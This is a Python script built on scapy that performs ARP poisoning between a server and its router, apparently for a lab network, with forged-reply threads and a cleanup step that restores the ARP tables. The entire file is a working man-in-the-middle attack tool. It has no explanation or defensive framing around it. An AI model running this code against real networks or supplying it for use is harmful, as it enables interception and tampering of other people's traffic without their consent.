import threading
import time
from scapy.all import ARP, Ether, send, srp, conf

def get_mac(ip):
    """
    Function to get the MAC address of a given IP
    :param ip: IP address
    :return: MAC address
    """
    try:
        # Create ARP request packet
        request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request

        # Send the packet and get the response
        answer = srp(final_packet, timeout=2, verbose=0)[0]

        # Extract the MAC address from the response
        mac = answer[0][1].hwsrc
        return mac
    except Exception as e:
        print(f"Error getting MAC address for {ip}: {e}")
        return None

def restore_to_defaults(dest, source):
    """
    Function to restore the ARP table to its default state
    :param dest: Destination IP address
    :param source: Source IP address
    """
    target_mac = get_mac(dest)
    source_mac = get_mac(source)

    if target_mac and source_mac:
        # Create ARP packet to restore ARP table
        packet = ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
        send(packet, verbose=0)
        print(f"Restored ARP table for {dest}")

def arp_poison(victim_ip, victim_mac, spoof_ip):
    """
    Function to poison ARP table of a victim
    :param victim_ip: IP address of the victim
    :param victim_mac: MAC address of the victim
    :param spoof_ip: IP address to spoof
    """
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(packet, verbose=0)

def start_arp_poisoning(victim_ip, victim_mac, spoof_ip, stop_event):
    while not stop_event.is_set():
        try:
            arp_poison(victim_ip, victim_mac, spoof_ip)
        except Exception as e:
            print(f"Error in ARP poisoning: {e}")
        time.sleep(1)

if __name__ == "__main__":
    
    server_ip = "198.7.0.2"
    router_ip = "198.7.0.1"
    middle_ip = "198.7.0.3"

    # Get MAC addresses
    server_mac = get_mac(server_ip)
    router_mac = get_mac(router_ip)

    if not server_mac or not router_mac:
        raise Exception("Could not get MAC addresses. Exiting...")


    print("Starting ARP poisoning...")

    # Event to signal stopping threads
    stop_event = threading.Event()

    # Starting threads for poisoning
    server_thread = threading.Thread(target=start_arp_poisoning, args=(server_ip, server_mac, router_ip, stop_event), daemon=True)
    router_thread = threading.Thread(target=start_arp_poisoning, args=(router_ip, router_mac, server_ip, stop_event), daemon=True)

    server_thread.start()
    router_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping ARP poisoning...")
        stop_event.set()
        server_thread.join()
        router_thread.join()
        print("Restoring ARP tables to default...")
        restore_to_defaults(server_ip, router_ip)
        restore_to_defaults(router_ip, server_ip)
        print("ARP poisoning stopped.")
